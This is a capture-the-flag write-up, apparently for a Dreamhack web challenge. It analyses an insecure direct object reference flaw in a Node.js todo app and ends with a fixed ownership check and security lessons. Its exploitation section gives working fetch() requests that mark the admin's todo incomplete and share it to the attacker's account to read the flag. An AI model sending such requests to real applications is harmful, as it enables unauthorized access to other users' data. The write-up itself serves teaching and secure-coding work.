# 🧾 TODOLIST 0.0.1

---

## Initial Analysis

### Application Structure

The application consists of:
- **Frontend**: Vue.js framework
- **Backend**: Node.js with H3 framework
- **Database**: SQLite
- **Authentication**: JWT (JSON Web Token)

### Database Schema

From `create.sql`, we can see the key tables:

```sql
-- Users table
CREATE TABLE IF NOT EXISTS Users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    email TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
);

-- TodoList table
CREATE TABLE IF NOT EXISTS Todolist (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    name TEXT NOT NULL,
    description TEXT,
    FOREIGN KEY (user_id) REFERENCES Users(id) ON DELETE CASCADE
);

-- Todo items
CREATE TABLE IF NOT EXISTS Todo (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    todo_list_id INTEGER,
    title TEXT NOT NULL,
    description TEXT,
    is_completed BOOLEAN DEFAULT 0,
    FOREIGN KEY (todo_list_id) REFERENCES Todolist(id)
);

-- Todo sharing functionality
CREATE TABLE IF NOT EXISTS TodoShares (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    todo_id INTEGER,
    user_id INTEGER,
    permission_type TEXT,
    FOREIGN KEY (todo_id) REFERENCES Todo(id),
    FOREIGN KEY (user_id) REFERENCES Users(id)
);
```

### Initial Data

The admin user is pre-created with a TODO item containing the flag:

```sql
INSERT INTO Users (username, email, password) VALUES (
    'admin',
    'admin@dreamhack.io',
    'helloworld' -- redacted
);

INSERT INTO Todo (todo_list_id, title, description, is_completed) VALUES (
    1,
    'flag',
    'DH{sample_flag}',
    1  -- Already completed
);
```

---

## Vulnerability Analysis

### 1. Missing Authorization in updateTodo.js

The `updateTodo.js` endpoint only verifies that the user is authenticated but doesn't check if the user owns the TODO item:

```javascript
export default defineEventHandler(async (event) => {
    const userData = verifyToken(event.req);  // Only checks if logged in
    const db = await openDatabase();
    const body = await readBody(event);
    
    const { id, value} = body;
    try {
        const result = await db.run(
            `UPDATE todo
             SET is_completed = ?
             WHERE id = ?`,
            [value, id]  // No ownership check!
          );
        return { success: true, message: 'Todo updated successfully', id: result.lastID };
    } catch (error) {
        throw createError({ statusCode: 500, statusMessage: 'Database error: ' + error.message });
    }
});
```

**Vulnerability**: Any authenticated user can modify any TODO item by specifying its ID.

### 2. Missing Authorization in shareTodo.js

Similarly, the `shareTodo.js` endpoint lacks proper authorization:

```javascript
export default defineEventHandler(async (event) => {
    const userData = verifyToken(event.req);  // Only authentication check
    const db = await openDatabase();
    const body = await readBody(event);
    
    const todo = body;
    try {
        const todo_data = await db.get(
            'SELECT * FROM Todo WHERE id = ?', [todo.id]
        );
        if (todo_data.is_completed === 1) {
            return { message: 'you cannot share already completed todo', id: todo_data.id}
        }

        const result = await db.run(
            `INSERT INTO TodoShares (todo_id, user_id, permission_type) VALUES
            (?, ?, ?)`,
            [todo_data.id, todo.target_id, 'shared']  // No ownership validation
          );
        return { success: true, message: 'Todo shared successfully', id: result.lastID };
    } catch (error) {
        throw createError({ statusCode: 500, statusMessage: 'Database error: ' + error.message });
    }
});
```

**Vulnerability**: Any authenticated user can share any TODO item to themselves, but completed TODOs cannot be shared.

### 3. Proper Authorization in todolist.js

The `todolist.js` endpoint correctly implements the sharing functionality:

```javascript
export default defineEventHandler(async (event) => {
    try {
        const userData = verifyToken(event.req);
        const db = await openDatabase();
        
        // Get user's own todos
        const todoList = await db.all('SELECT * FROM Todo where todo_list_id=(SELECT id FROM Todolist WHERE Todolist.user_id = ?)', [userData.userId]);
 
        // Get shared todos
        const sharedList = await db.all('SELECT * FROM TodoShares where user_id= ? ', [userData.userId]);
        for (const shared of sharedList){
            if (shared.permission_type === "owner" || shared.permission_type === "shared")
            todoList.push(await db.get('SELECT * FROM Todo where id = ?',[shared.todo_id]));
        };
        return todoList;
    } catch (error) {
        return createError({
            statusCode: 401,
            statusMessage: 'Unauthorized: ' + error.message
        });
    }
});
```

This endpoint properly shows both owned and shared TODO items.

---

## Exploitation Steps

### Step 1: User Registration

First, create a new user account to obtain a valid JWT token:

```javascript
// Register at /signup
{
    "username": "test",
    "email": "test@gmail.com", 
    "password": "test1234"
}
```

After registration, the new user gets ID `2` (admin has ID `1`).

### Step 2: Attempt Direct Sharing (Fails)

Try to share admin's TODO item directly:

```javascript
fetch('/api/shareTodo', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${localStorage.getItem('auth_token')}`,
  },
  body: JSON.stringify({
    id: 1,        // Admin's todo ID
    target_id: 2  // Our user ID
  }),
})
.then(response => response.json())
.then(data => console.log(data));
```

**Result**: `"you cannot share already completed todo"` - The admin's TODO is already marked as completed.

### Step 3: Modify TODO Status

Use the authorization bypass in `updateTodo.js` to mark admin's TODO as incomplete:

```javascript
fetch('/api/updateTodo', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${localStorage.getItem('auth_token')}`,
  },
  body: JSON.stringify({
    id: 1,         // Admin's todo ID
    value: false   // Mark as incomplete
  }),
})
.then(response => response.json())
.then(data => console.log(data));
```

**Result**: `"Todo updated successfully"` - Admin's TODO is now marked as incomplete.

### Step 4: Share the TODO

Now share admin's TODO item to our account:

```javascript
fetch('/api/shareTodo', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${localStorage.getItem('auth_token')}`,
  },
  body: JSON.stringify({
    id: 1,        // Admin's todo ID
    target_id: 2  // Our user ID
  }),
})
.then(response => response.json())
.then(data => console.log(data));
```

**Result**: `"Todo shared successfully"`

### Step 5: Access the Flag

Refresh the TODO list page. The admin's TODO item (containing the flag) now appears in our TODO list due to the sharing functionality.

---

## Root Cause Analysis

### Missing Authorization Checks

The core vulnerability stems from insufficient authorization validation:

1. **Authentication vs Authorization**: The application only checks if a user is logged in (`verifyToken`) but doesn't verify if they have permission to perform specific actions on specific resources.

2. **IDOR (Insecure Direct Object Reference)**: Users can manipulate TODO items by directly referencing their IDs without ownership validation.

3. **Business Logic Bypass**: The sharing restriction (completed TODOs cannot be shared) can be bypassed by first modifying the TODO status.

### Secure Implementation

The vulnerable endpoints should include ownership checks:

```javascript
// Secure updateTodo.js
export default defineEventHandler(async (event) => {
    const userData = verifyToken(event.req);
    const db = await openDatabase();
    const body = await readBody(event);
    
    const { id, value } = body;
    
    // Verify ownership
    const todo = await db.get(
        'SELECT t.* FROM Todo t JOIN Todolist tl ON t.todo_list_id = tl.id WHERE t.id = ? AND tl.user_id = ?',
        [id, userData.userId]
    );
    
    if (!todo) {
        throw createError({ statusCode: 403, statusMessage: 'Access denied' });
    }
    
    // Continue with update...
});
```

---

## Lessons Learned

1. **Implement proper authorization**: Always verify resource ownership before allowing modifications.

2. **Principle of least privilege**: Users should only access resources they own or have explicit permission to access.

3. **Business logic validation**: Security controls should be consistently applied across all related functionalities.

4. **Input validation**: Always validate that user-provided IDs correspond to resources the user is authorized to access.

---

## Technical Details

- **Framework**: Vue.js frontend with Node.js/H3 backend
- **Database**: SQLite with proper foreign key relationships
- **Authentication**: JWT tokens with 3-hour expiration
- **Vulnerability Type**: Insecure Direct Object Reference (IDOR) + Authorization Bypass
- **Impact**: Access to sensitive data (admin's TODO items containing flags)

This vulnerability demonstrates the importance of implementing proper authorization checks in web applications, especially when dealing with user-generated content and sharing functionalities.
